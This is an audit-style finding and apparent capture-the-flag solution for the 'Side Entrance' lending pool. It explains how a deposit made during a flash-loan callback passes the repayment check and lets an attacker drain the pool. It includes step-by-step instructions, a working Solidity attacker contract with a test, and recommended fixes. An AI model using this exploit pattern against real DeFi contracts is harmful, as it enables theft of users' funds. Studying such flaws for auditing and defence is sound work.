### [H-1] Deposit during flash loan callback inflates balance without repaying, enabling full pool drain

**Description:** In `SideEntranceLenderPool`, the `flashLoan()` function validates 
repayment by checking `address(this).balance >= balanceBefore`. However, the pool 
also accepts ETH deposits via `deposit()` which increases `address(this).balance` 
and records a balance credit for the depositor. An attacker can borrow ETH via 
flash loan, deposit it back through `deposit()` during the `execute()` callback — 
satisfying the balance check while simultaneously recording a withdrawable balance 
equal to the loan amount.

**Impact:** An attacker can drain the pool's entire ETH balance in two transactions 
— one flash loan to acquire a deposit credit, one withdrawal to claim it — sending 
all funds to an arbitrary recovery address.

**Proof of Concept:**
1. Call `flashLoan(ETHER_IN_POOL)` — pool sends full balance to attacker contract.
2. Inside `execute()` callback — call `pool.deposit{value: ETHER_IN_POOL}()`.
3. Pool balance check passes — `address(this).balance` is restored.
4. Attacker now has `balances[attacker] = ETHER_IN_POOL` recorded.
5. Call `pool.withdraw()` — pool sends full balance to attacker.
6. Forward ETH to recovery.

<details>
<summary>Example Code Snippet</summary>

```solidity
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address recovery;

    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    function withdraw() external {
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, address(this).balance);
    }

    receive() external payable {}
}

function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceAttacker attacker = new SideEntranceAttacker(
        address(pool), recovery
    );
    attacker.attack(ETHER_IN_POOL);
    attacker.withdraw();
}
```
</details>

**Recommended Mitigation:**
1. Track pool liquidity separately from `address(this).balance` — use an internal 
   `totalLiquidity` variable updated only through controlled functions.
2. Validate repayment against `totalLiquidity` not raw ETH balance — deposits 
   during a flash loan should not count as repayment.
3. Add a reentrancy guard — prevent `deposit()` from being called while a flash 
   loan is in progress using a `nonReentrant` modifier or a `locked` state flag.